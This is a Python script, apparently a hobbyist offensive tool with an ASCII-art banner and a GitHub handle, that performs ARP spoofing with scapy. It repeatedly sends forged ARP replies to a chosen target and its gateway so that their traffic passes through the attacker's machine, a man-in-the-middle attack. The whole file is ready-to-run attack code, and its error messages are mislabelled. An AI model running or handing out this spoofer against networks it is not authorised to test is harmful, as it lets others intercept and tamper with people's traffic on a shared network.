import scapy.all as scapy
import optparse
import time
import sys

print("\033[1;32m")
print("..................,,..........................    _  _  _     _           _        _        _           _  _  _  _  _  _    ")
print("................':ol,......................... _ (_)(_)(_) _ (_)         (_)     _(_)_     (_) _     _ (_)(_)(_)(_)(_)(_)   ")
print("...........'',;;:llc;,'.......................(_)         (_)(_)         (_)   _(_) (_)_   (_)(_)   (_)(_)(_)               ")
print("......';;::lollccclllc;,......................(_)            (_) _  _  _ (_) _(_)     (_)_ (_) (_)_(_) (_)(_) _  _          ")
print("......,dko,,;:lollloooolc'....................(_)            (_)(_)(_)(_)(_)(_) _  _  _ (_)(_)   (_)   (_)(_)(_)(_)         ")
print(".....,XWd...'clc;;;;;:cco;....................(_)          _ (_)         (_)(_)(_)(_)(_)(_)(_)         (_)(_)               ")
print(".....;NNl..;oxdoc:d. .xNK:....................(_) _  _  _ (_)(_)         (_)(_)         (_)(_)         (_)(_) _  _  _  _    ")
print(".....'clddxkkkkddol,.'kX0l'...................   (_)(_)(_)   (_)         (_)(_)         (_)(_)         (_)(_)(_)(_)(_)(_)   ")
print("....'lxkkkkkOOOOOkkdlc:clc,...................")
print("....''....''',,,;;:loollll,...................")
print("....................',;;;;c'..................")
print(".......'.. .............';::.................. _              _  _  _  _  _   _  _  _  _    _           _    ")
print(".......,................,;cc..................(_)            (_)(_)(_)(_)(_)_(_)(_)(_)(_)_ (_) _       (_)   ")
print(".......''',co;,::;,''...;c:c..................(_)            (_)           (_)          (_)(_)(_)_     (_)   ")
print("........'',''';clllc::cc:;:l.......',,,''.....(_)            (_) _  _      (_)          (_)(_)  (_)_   (_)   ")
print("...........;c:..;:c;;;;,,,cc.....,;,'''',,'...(_)            (_)(_)(_)     (_)          (_)(_)    (_)_ (_)   ")
print("...........':c..','',,,,,,c:....,;'.''''.',...(_)            (_)           (_)          (_)(_)      (_)(_)   ")
print("...........';,..'''',,,..'cl'...','''''''.;...(_) _  _  _  _ (_) _  _  _  _(_)_  _  _  _(_)(_)         (_)   ")
print("...........,;;'..........,cl,;,''''',,,,'',...(_)(_)(_)(_)(_)(_)(_)(_)(_)(_) (_)(_)(_)(_)  (_)         (_)   ")
print(".........'',,,,;'...... ..,cc;;,,;;'',,'''....")
print(".......'::ccc:;;;;;'..,;,,,,c;'........'......")
print("..........''..........::,'.,:c,...............")
print("..............................................")
print("[-]Github:https://github.com/unlucky12345")
print("............................................................................................................................")
print("")
print("")
print("")
print("")




def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP target")
    parser.add_option("-g", "--gate", dest="gate", help="IP Gateway")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an interface, use --help for more info")
    elif not options.gate:
        parser.error("[-] Pleae specify a new mac, use --help for more info")
    return options
options = get_arguments()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]



    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

print("[*] Target: " + options.target)
print("[*] Gateway: " + options.gate)

print("---------------------------------")
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gate)
        spoof(options.gate, options.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets sent : " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("")
    print("")
    print("Byeeeeeeeeeeeeeee :) ")